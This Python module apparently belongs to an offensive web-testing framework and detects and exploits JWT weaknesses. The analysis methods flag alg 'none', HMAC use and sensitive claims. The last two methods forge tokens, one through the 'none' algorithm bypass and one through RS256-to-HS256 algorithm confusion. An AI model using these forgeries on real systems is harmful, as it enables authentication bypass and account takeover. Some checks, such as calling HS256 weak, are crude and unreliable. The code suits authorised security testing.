#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - JWT Module
JWT Security testing module
"""

import re
import base64
import json


from config import Colors


class JWTModule:
    """JWT Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "JWT Weakness"
        
        # JWT patterns
        self.jwt_pattern = r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for JWT in parameters"""
        # Check if parameter contains JWT
        if re.match(self.jwt_pattern, value):
            self._analyze_jwt(url, param, value)
    
    def test_url(self, url: str):
        """Test URL for JWT"""
        # Extract JWT from cookies/headers
        try:
            response = self.requester.request(url, 'GET')
            
            if not response:
                return
            
            # Check cookies
            cookies = response.headers.get('Set-Cookie', '')
            jwt_matches = re.findall(self.jwt_pattern, cookies)
            
            for jwt in jwt_matches:
                self._analyze_jwt(url, 'Cookie', jwt)
            
            # Check response body
            jwt_matches = re.findall(self.jwt_pattern, response.text)
            for jwt in jwt_matches:
                self._analyze_jwt(url, 'Response Body', jwt)
                
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'JWT test error: {e}')}")
    
    def _analyze_jwt(self, url: str, location: str, token: str):
        """Analyze JWT for weaknesses"""
        try:
            # Split JWT
            parts = token.split('.')
            if len(parts) != 3:
                return
            
            # Decode header
            header_b64 = parts[0]
            # Add padding if needed
            header_b64 += '=' * (4 - len(header_b64) % 4)
            header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            header = json.loads(header_json)
            
            # Decode payload
            payload_b64 = parts[1]
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
            payload = json.loads(payload_json)
            
            weaknesses = []
            
            # Check algorithm
            alg = header.get('alg', '')
            
            if alg == 'none':
                weaknesses.append("Algorithm 'none' - signature bypass possible")
            elif alg == 'HS256':
                weaknesses.append("Weak HMAC algorithm (HS256)")
            elif alg in ['RS256', 'ES256']:
                # Check for algorithm confusion
                weaknesses.append("Asymmetric algorithm - check for algorithm confusion")
            
            # Check for sensitive data
            sensitive_keys = ['password', 'secret', 'key', 'admin', 'role', 'privileges', 'permissions']
            for key in sensitive_keys:
                if key in json.dumps(payload).lower():
                    weaknesses.append(f"Sensitive data in payload: {key}")
            
            # Check for expired token
            import time
            exp = payload.get('exp')
            if exp and exp < time.time():
                weaknesses.append("Token expired")
            
            # Check for weak secrets (if we can brute force)
            if alg.startswith('HS'):
                weaknesses.append("HMAC algorithm - brute force possible")
            
            if weaknesses:
                from core.engine import Finding
                finding = Finding(
                    technique="JWT Weakness",
                    url=url,
                    severity='HIGH',
                    confidence=0.8,
                    param=location,
                    payload=token[:50] + '...',
                    evidence='; '.join(weaknesses),
                    extracted_data=json.dumps({'header': header, 'payload': payload}, indent=2),
                )
                self.engine.add_finding(finding)
                
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'JWT analysis error: {e}')}")
    
    def exploit_none_algorithm(self, token: str) -> str:
        """Generate JWT with 'none' algorithm"""
        try:
            parts = token.split('.')
            
            # Modify header to use 'none' algorithm
            header = {'alg': 'none', 'typ': 'JWT'}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            
            # Keep original payload
            payload_b64 = parts[1]
            
            # Empty signature for 'none' algorithm
            return f"{header_b64}.{payload_b64}."
            
        except Exception as e:
            print(f"{Colors.error(f'JWT none alg exploit error: {e}')}")
            return None
    
    def exploit_algorithm_confusion(self, token: str, public_key: str) -> str:
        """Attempt algorithm confusion attack"""
        try:
            parts = token.split('.')
            
            # Change algorithm from RS256 to HS256
            header = {'alg': 'HS256', 'typ': 'JWT'}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            
            # Keep original payload
            payload_b64 = parts[1]
            
            # Sign with public key as HMAC secret
            import hmac
            import hashlib
            
            message = f"{header_b64}.{payload_b64}"
            signature = hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            return f"{header_b64}.{payload_b64}.{sig_b64}"
            
        except Exception as e:
            print(f"{Colors.error(f'JWT alg confusion error: {e}')}")
            return None
